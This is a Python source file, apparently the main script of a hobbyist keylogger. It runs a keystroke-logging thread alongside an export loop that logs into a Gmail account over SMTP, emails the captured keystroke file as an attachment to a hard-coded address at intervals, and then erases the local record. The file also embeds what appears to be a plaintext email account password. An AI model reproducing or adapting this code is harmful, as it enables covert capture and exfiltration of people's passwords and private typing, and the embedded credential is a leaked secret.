"""
Main file that both starts the logger and the export script
By Connor Jackson (BootSkiing)
"""
import smtplib
import datetime
import pause
import logger
import threading
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# To and From email addresses (Same address for testing purposes)
FRM_ADDRESS = "keylogger.0w0@gmail.com"
TO_ADDRESS = "keylogger.0w0@gmail.com"

# Bot email account info
USR_NAME = "keylogger.0w0"
FRM_PSWD = "DGisonline13"

# Path to record.txt
REC_PATH = "record.txt"

# Counter for how many emails to send
COUNTER = 5
# Number of Seconds to pause
PAUSE_TIME = 15


def export():
    """
    Method waits a specified amount of time and then sends an email to a specified email address, with the output
    file attached. Loops for a specified number of times

    :return:
    """
    # Counter for export loop. Really only used for testing
    counter = COUNTER

    while counter > 0:

        # Waiting 30 seconds for more keys to be typed
        pause.seconds(PAUSE_TIME)

        # Set up connection / login to email account
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(FRM_ADDRESS, FRM_PSWD)

        # Create the headers and body for the email (Includes date/time)
        msg = MIMEMultipart()
        msg['From'] = FRM_ADDRESS
        msg['To'] = TO_ADDRESS
        msg['Subject'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        body = " Loggings from: " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg.attach(MIMEText(body, 'plain'))

        # Open record.txt as a MINEBase object (Necessary for attaching to email)
        file = MIMEBase('application', 'octet-stream')
        file.set_payload(open(REC_PATH, 'rb').read())
        encoders.encode_base64(file)
        file.add_header('Content-Disposition', 'attachment; filename="text.txt"')
        msg.attach(file)

        # Send and close connection to mail server
        server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg.as_string())
        server.quit()

        # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
        open(REC_PATH, 'w').close()

        # Decrement counter
        counter -= 1
    return


def main():
    """
    main funtion for exporter. Starts a logger and exporter as seperate threads so that they can run simultaneously.
    Exporter will end after specified iterations, but logger is only ended with kill key

    :return:
    """
    t1 = threading.Thread(target=export)
    t2 = threading.Thread(target=logger.listen)
    t1.start()
    t2.start()


if __name__ == '__main__':
    # Runs exporter
    main()
